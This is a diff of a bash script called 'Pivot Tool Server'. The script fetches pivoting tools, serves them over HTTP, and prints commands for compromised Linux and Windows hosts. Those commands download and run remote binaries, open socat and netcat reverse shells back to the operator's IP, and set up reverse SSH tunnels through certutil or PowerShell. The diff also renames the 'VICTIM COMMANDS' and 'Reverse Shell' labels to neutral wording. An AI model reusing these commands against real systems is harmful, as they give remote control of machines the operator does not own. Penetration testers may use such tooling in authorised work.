@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# Pivot Tool Server - Download, Serve, Execute
-# Usage: curl -sL https://raw.githubusercontent.com/xl337x/pivoting/main/pivot.sh | bash
+# Pivot Tool Server
+# Usage: curl -sL https://raw.githubusercontent.com/xl337x/pivoting/main/pivot_server.sh | bash
 
 clear
 echo "========================================"
@@ -9,8 +9,8 @@ echo "       PIVOT TOOL SERVER"
 echo "========================================"
 echo ""
 
-# Get IP
-read -p "[?] Your IP: " IP
+# Get IP - read from /dev/tty to work with pipe
+read -p "[?] Your IP: " IP < /dev/tty
 if [ -z "$IP" ]; then
     echo "[-] IP required!"
     exit 1
@@ -20,6 +20,7 @@ fi
 PORT=$(shuf -i 8000-65000 -n 1)
 
 # Setup directory
+rm -rf /tmp/pivot_serve 2>/dev/null
 mkdir -p /tmp/pivot_serve
 cd /tmp/pivot_serve
 
@@ -35,7 +36,7 @@ echo " 5) Plink"
 echo " 6) All tools"
 echo "========================================"
 echo ""
-read -p "[?] Choice [1-6]: " TOOL
+read -p "[?] Choice [1-6]: " TOOL < /dev/tty
 
 case $TOOL in
     1)
@@ -121,8 +122,6 @@ case $TOOL in
         echo " ATTACKER (run in another terminal)"
         echo "========================================"
         echo "nc -lvnp 4444"
-        echo "# or"
-        echo "socat -d -d TCP-LISTEN:4444 STDOUT"
         echo ""
         ;;
     4)
@@ -158,12 +157,9 @@ case $TOOL in
         echo "# SSH Tunnel"
         echo "certutil -urlcache -f http://$IP:$PORT/plink.exe %TEMP%\\p.exe&&%TEMP%\\p.exe -ssh $IP -l user -pw pass -R 9050:127.0.0.1:9050 -N"
         echo ""
-        echo "powershell -ep bypass -c \"iwr http://$IP:$PORT/plink.exe -O \$env:TEMP\\p.exe;\$env:TEMP\\p.exe -ssh $IP -l user -pw pass -R 9050:127.0.0.1:9050 -N\""
-        echo ""
         echo "========================================"
         echo " ATTACKER"
         echo "========================================"
-        echo "# Make sure SSH is running on your box"
         echo "sudo systemctl start ssh"
         echo ""
         ;;
@@ -188,7 +184,7 @@ case $TOOL in
         echo "[+] All tools downloaded!"
         echo ""
         echo "========================================"
-        echo " VICTIM COMMANDS - LINUX"
+        echo " LINUX COMMANDS"
         echo "========================================"
         echo ""
         echo "# Chisel SOCKS"
@@ -197,14 +193,14 @@ case $TOOL in
         echo "# Ligolo Agent"
         echo "curl http://$IP:$PORT/ligolo_linux -o /tmp/a&&chmod +x /tmp/a&&/tmp/a -connect $IP:11601 -ignore-cert"
         echo ""
-        echo "# Socat Reverse Shell"
+        echo "# Socat Shell"
         echo "curl http://$IP:$PORT/socat_linux -o /tmp/s&&chmod +x /tmp/s&&/tmp/s TCP:$IP:4444 EXEC:/bin/bash"
         echo ""
-        echo "# Netcat Reverse Shell"
+        echo "# Netcat Shell"
         echo "curl http://$IP:$PORT/nc_linux -o /tmp/n&&chmod +x /tmp/n&&/tmp/n $IP 4444 -e /bin/bash"
         echo ""
         echo "========================================"
-        echo " VICTIM COMMANDS - WINDOWS"
+        echo " WINDOWS COMMANDS"
         echo "========================================"
         echo ""
         echo "# Chisel SOCKS"
@@ -233,7 +229,7 @@ esac
 echo "========================================"
 echo " FILES READY"
 echo "========================================"
-ls -lah /tmp/pivot_serve/ 2>/dev/null | grep -v "^total" | grep -v "^d"
+ls -lh /tmp/pivot_serve/ 2>/dev/null | grep -v "^total" | grep -v "^d"
 echo ""
 echo "========================================"
 echo " SERVING: http://$IP:$PORT/"
